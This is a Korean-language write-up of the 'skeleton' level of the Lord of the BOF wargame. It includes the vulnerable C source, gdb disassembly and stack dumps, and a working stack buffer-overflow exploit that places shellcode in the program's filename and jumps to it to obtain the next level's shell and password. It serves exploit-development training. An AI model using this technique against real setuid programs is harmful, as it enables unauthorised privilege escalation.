# skeleton

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i, saved_argc;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        // argc saver
        saved_argc = argc;

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // ultra argv hunter!
        for(i=0; i<saved_argc; i++)
                memset(argv[i], 0, strlen(argv[i]));
}
```

argv를 싹다 초기화 시키는 코드가 추가된 문제이다.

결국 내가 접근할 수 있는 부분은 ret부분 뿐인데, /xbf조건이 걸려있어 RTL도 사용할 수 없다. 

수많은 고민 끝에 argc를 저장하는 saved_argc를 overwrite해서 실제론 2개의 인자를 줬지만 1개의 인자를 받은 것으로 저장해 argv[0]만 지울 수 있도록 공격해보려고 했다. 먼저 gdb로 saved_argc가 어디있는지 확인한 뒤에 접근할 수 있는지 보도록 하자.

```assembly
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x8048500 <main>:       push   %ebp
0x8048501 <main+1>:     mov    %ebp,%esp
0x8048503 <main+3>:     sub    %esp,48
0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:    jg     0x8048523 <main+35>
0x804850c <main+12>:    push   0x80486d0
0x8048511 <main+17>:    call   0x8048410 <printf>
0x8048516 <main+22>:    add    %esp,4
0x8048519 <main+25>:    push   0
0x804851b <main+27>:    call   0x8048420 <exit>
0x8048520 <main+32>:    add    %esp,4
0x8048523 <main+35>:    nop
0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:    nop
0x804852c <main+44>:    lea    %esi,[%esi*1]
0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:    lea    %edx,[%eax*4]
0x804853a <main+58>:    mov    %eax,%ds:0x8049804
0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:    jne    0x8048547 <main+71>
0x8048545 <main+69>:    jmp    0x8048587 <main+135>
0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:    lea    %edx,[%eax*4]
0x8048551 <main+81>:    mov    %eax,%ds:0x8049804
0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:    push   %edx
0x804855a <main+90>:    call   0x80483f0 <strlen>
0x804855f <main+95>:    add    %esp,4
0x8048562 <main+98>:    mov    %eax,%eax
0x8048564 <main+100>:   push   %eax
0x8048565 <main+101>:   push   0
0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:   lea    %edx,[%eax*4]
0x8048571 <main+113>:   mov    %eax,%ds:0x8049804
0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:   push   %edx
0x804857a <main+122>:   call   0x8048430 <memset>
0x804857f <main+127>:   add    %esp,12
0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:   jmp    0x8048530 <main+48>
0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:   add    %eax,4
0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:   add    %edx,47
0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:   je     0x80485b0 <main+176>
0x8048597 <main+151>:   push   0x80486dc
0x804859c <main+156>:   call   0x8048410 <printf>
0x80485a1 <main+161>:   add    %esp,4
0x80485a4 <main+164>:   push   0
0x80485a6 <main+166>:   call   0x8048420 <exit>
0x80485ab <main+171>:   add    %esp,4
0x80485ae <main+174>:   mov    %esi,%esi
0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:   add    %eax,4
0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:   push   %edx
0x80485b9 <main+185>:   call   0x80483f0 <strlen>
0x80485be <main+190>:   add    %esp,4
0x80485c1 <main+193>:   mov    %eax,%eax
0x80485c3 <main+195>:   cmp    %eax,48
0x80485c6 <main+198>:   jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:   push   0x80486f9
---Type <return> to continue, or q <return> to quit---
0x80485cd <main+205>:   call   0x8048410 <printf>
0x80485d2 <main+210>:   add    %esp,4
0x80485d5 <main+213>:   push   0
0x80485d7 <main+215>:   call   0x8048420 <exit>
0x80485dc <main+220>:   add    %esp,4
0x80485df <main+223>:   nop
0x80485e0 <main+224>:   mov    %eax,DWORD PTR [%ebp+8]
0x80485e3 <main+227>:   mov    DWORD PTR [%ebp-48],%eax
0x80485e6 <main+230>:   mov    %eax,DWORD PTR [%ebp+12]
0x80485e9 <main+233>:   add    %eax,4
0x80485ec <main+236>:   mov    %edx,DWORD PTR [%eax]
0x80485ee <main+238>:   push   %edx
0x80485ef <main+239>:   lea    %eax,[%ebp-40]
0x80485f2 <main+242>:   push   %eax
0x80485f3 <main+243>:   call   0x8048440 <strcpy>
0x80485f8 <main+248>:   add    %esp,8
0x80485fb <main+251>:   lea    %eax,[%ebp-40]
0x80485fe <main+254>:   push   %eax
0x80485ff <main+255>:   push   0x8048710
0x8048604 <main+260>:   call   0x8048410 <printf>
0x8048609 <main+265>:   add    %esp,8
0x804860c <main+268>:   push   40
0x804860e <main+270>:   push   0
0x8048610 <main+272>:   lea    %eax,[%ebp-40]
0x8048613 <main+275>:   push   %eax
0x8048614 <main+276>:   call   0x8048430 <memset>
0x8048619 <main+281>:   add    %esp,12
0x804861c <main+284>:   mov    DWORD PTR [%ebp-44],0x0
0x8048623 <main+291>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048626 <main+294>:   cmp    %eax,DWORD PTR [%ebp-48]
0x8048629 <main+297>:   jl     0x8048630 <main+304>
0x804862b <main+299>:   jmp    0x8048670 <main+368>
0x804862d <main+301>:   lea    %esi,[%esi]
0x8048630 <main+304>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048633 <main+307>:   lea    %edx,[%eax*4]
0x804863a <main+314>:   mov    %eax,DWORD PTR [%ebp+12]
0x804863d <main+317>:   mov    %edx,DWORD PTR [%eax+%edx]
0x8048640 <main+320>:   push   %edx
0x8048641 <main+321>:   call   0x80483f0 <strlen>
0x8048646 <main+326>:   add    %esp,4
0x8048649 <main+329>:   mov    %eax,%eax
0x804864b <main+331>:   push   %eax
0x804864c <main+332>:   push   0
0x804864e <main+334>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048651 <main+337>:   lea    %edx,[%eax*4]
0x8048658 <main+344>:   mov    %eax,DWORD PTR [%ebp+12]
0x804865b <main+347>:   mov    %edx,DWORD PTR [%eax+%edx]
0x804865e <main+350>:   push   %edx
0x804865f <main+351>:   call   0x8048430 <memset>
0x8048664 <main+356>:   add    %esp,12
0x8048667 <main+359>:   inc    DWORD PTR [%ebp-44]
0x804866a <main+362>:   jmp    0x8048623 <main+291>
0x804866c <main+364>:   lea    %esi,[%esi*1]
0x8048670 <main+368>:   leave
0x8048671 <main+369>:   ret
```

main+224 부분을 보면 argc의 값을 saved_argc로 옮기는 과정임을 알 수 있다(코드랑 비교해보면 된다)

그럼 실행을 시키고 어느 부분인지 봐 보도록 하자.

```assembly
(gdb) b*main+230
Breakpoint 1 at 0x80485e6
(gdb) r `python -c 'print "\x90"*47+"\xbf"'`
Starting program: /home/vampire/asdfasdf `python -c 'print "\x90"*47+"\xbf"'`

Breakpoint 1, 0x80485e6 in main ()
(gdb) x/wx $ebp-48
0xbffffaf8:     0x00000002
```

 우선 argc가 저장되고 나서 상태를 봐야하므로 끝나는 지점인 main+230에 breakpoint를 걸고 조건에 부합하게 입력을 넣어주면 saved_argc라고 예상했던 $ebp-48부분에 2라는 인자가 제대로 옮겨짐을 알 수 있다. 그런데 이상하게 saved_argc가 buffer보다 위에 있었다. 그래서 overwrite 공격을 할 수 없게 되었다.(나중에 추가하자)

```assembly
(gdb) x/100x $esp
0xbffffaf8:     0x080482d0      0x00000013      0xbffffb28      0x4000a970
0xbffffb08:     0x400f855b      0x08049734      0x4000ae60      0xbffffb74
0xbffffb18:     0xbffffb28      0x080484eb      0x08049720      0x08049734
0xbffffb28:     0xbffffb48      0x400309cb      0x00000002      0xbffffb74
0xbffffb38:     0xbffffb80      0x40013868      0x00000002      0x08048450
0xbffffb48:     0x00000000      0x08048471      0x08048500      0x00000002
0xbffffb58:     0xbffffb74      0x08048390      0x080486ac      0x4000ae60
0xbffffb68:     0xbffffb6c      0x40013e90      0x00000002      0xbffffc61
0xbffffb78:     0xbffffc78      0x00000000      0xbffffca9      0xbffffccb
0xbffffb88:     0xbffffcd5      0xbffffce3      0xbffffcfd      0xbffffd0d
0xbffffb98:     0xbffffd25      0xbffffd42      0xbffffd4d      0xbffffd5b
0xbffffba8:     0xbffffd9e      0xbffffdb1      0xbffffdc6      0xbffffdd6
0xbffffbb8:     0xbffffde3      0xbffffe02      0xbffffe0d      0xbffffe1a
0xbffffbc8:     0xbffffe22      0x00000000      0x00000003      0x08048034
0xbffffbd8:     0x00000004      0x00000020      0x00000005      0x00000006
0xbffffbe8:     0x00000006      0x00001000      0x00000007      0x40000000
0xbffffbf8:     0x00000008      0x00000000      0x00000009      0x08048450
0xbffffc08:     0x0000000b      0x000001fd      0x0000000c      0x000001fd
0xbffffc18:     0x0000000d      0x000001fd      0x0000000e      0x000001fd
0xbffffc28:     0x00000010      0x0fabfbff      0x0000000f      0xbffffc5c
0xbffffc38:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc48:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffc58:     0x00000000      0x36383669      0x6f682f00      0x762f656d
0xbffffc68:     0x69706d61      0x612f6572      0x61666473      0x00666473
0xbffffc78:     0x90909090      0x90909090      0x90909090      0x90909090
...
(gdb) x/wx $ebp-48
0xbffffaf8:     0x00000002
```

위 스택을 보면 \x90이 들어가 있는 주소보다 위에 $ebp-48이 있음을 알 수 있다. 

왜 그렇게 된지는 아직 못 찾았지만 결론은 저 방법으로 공격이 안되다는 것이다. 그래서 결국 write-up을 보고 새로운 방법을 찾았다. stack layout을 보면 마지막쯤에 program name이 다시 한 번 나오는 것을 볼 수 있는데 여기 있는 프로그램 이름은 지워지지 않으므로 이 부분을 ret값으로 주면 될 것 같다.

그럼 일단 프로그램의 이름에 쉘 코드가 들어간 링크 파일을 만들고 마지막에 있는 부분을 ret에 써주면 다시 프로그램이 실행되면서 쉘 코드가 작동할 것이다. 이름은 길이가 비슷해야 하므로 문자'b'를 넣어 250개로 맞추고 입력을 넣어 core를 확인한다. 

```bash
[vampire@192 vampire]$ cp skeleton `python -c 'print "b"*250'`
[vampire@192 vampire]$ ./bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb `python -c 'print "\x90"*47+"\xbf"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
Segmentation fault (core dumped)
[vampire@192 vampire]$ gdb -c core -q
Core was generated by `                                                                              '.
Program terminated with signal 11, Segmentation fault.
#0  0xbf909090 in ?? ()
```

여기서 스택이 더 나오지 않을 때까지 출력해보면 중간에 파일이름을 가진 부분이 있을 것이다.

```assembly
(gdb) x/100x $esp
0xbffff860:     0x00000000      0xbffff8a4      0xbffff8b0      0x40013868
0xbffff870:     0x00000002      0x08048450      0x00000000      0x08048471
0xbffff880:     0x08048500      0x00000002      0xbffff8a4      0x08048390
0xbffff890:     0x080486ac      0x4000ae60      0xbffff89c      0x40013e90
0xbffff8a0:     0x00000002      0xbffff996      0xbffffa93      0x00000000
0xbffff8b0:     0xbffffac4      0xbffffae6      0xbffffaf0      0xbffffafe
0xbffff8c0:     0xbffffb18      0xbffffb28      0xbffffb40      0xbffffb5d
0xbffff8d0:     0xbffffb68      0xbffffb76      0xbffffbb9      0xbffffbcc
0xbffff8e0:     0xbffffbe1      0xbffffbf1      0xbffffbfe      0xbffffc1d
0xbffff8f0:     0xbffffc28      0xbffffc35      0xbffffc3d      0xbffffe00
0xbffff900:     0x00000000      0x00000003      0x08048034      0x00000004
0xbffff910:     0x00000020      0x00000005      0x00000006      0x00000006
0xbffff920:     0x00001000      0x00000007      0x40000000      0x00000008
0xbffff930:     0x00000000      0x00000009      0x08048450      0x0000000b
0xbffff940:     0x000001fd      0x0000000c      0x000001fd      0x0000000d
0xbffff950:     0x000001fd      0x0000000e      0x000001fd      0x00000010
0xbffff960:     0x0fabfbff      0x0000000f      0xbffff991      0x00000000
0xbffff970:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff980:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff990:     0x38366900      0x00000036      0x00000000      0x00000000
0xbffff9a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff9b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff9c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff9d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff9e0:     0x00000000      0x00000000      0x00000000      0x00000000
...(중략)...
(gdb)
0xbffffea0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffeb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffec0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffed0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffee0:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffef0:     0x00000000      0x00000000      0x00000000      0x2e000000
0xbfffff00:     0x6262622f      0x62626262      0x62626262      0x62626262
0xbfffff10:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff20:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff30:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff40:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff50:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff60:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff70:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff80:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffff90:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffffa0:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffffb0:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffffc0:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffffd0:     0x62626262      0x62626262      0x62626262      0x62626262
0xbfffffe0:     0x62626262      0x62626262      0x62626262      0x62626262
0xbffffff0:     0x62626262      0x62626262      0x00626262      0x00000000
0xc0000000:     Cannot access memory at address 0xc0000000
```

역시 끝나기 전에 'b'(\x62)로 채워진 부분이 있다. 여기를 ret부분으로 정해 공격해보자.

```bash
[vampire@192 vampire]$ ls
asdfasdf
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
core
ji????????????????????????????????????????????????????????????????????????????????????????????????????▒?^1ɱ2?l?▒??▒?u▒▒?▒▒▒▒▒2▒Qi00tii0cjo?▒QT?▒?▒?▒?????????????????????????????????????????????????????????????????????????????????????????????????????
skeleton
skeleton.c
[vampire@192 vampire]$ ./ji▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒QT▒⚱^L΁▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
[vampire@192 vampire]$ ./ji▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒  `python -c 'print "\x90"*44+"\x30\xff\xff\xbf"'`▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒0▒▒▒
bash$ whoami
skeleton
bash$ my-pass
euid = 510
shellcoder
```

skeleton의 password는 shellcoder이다.





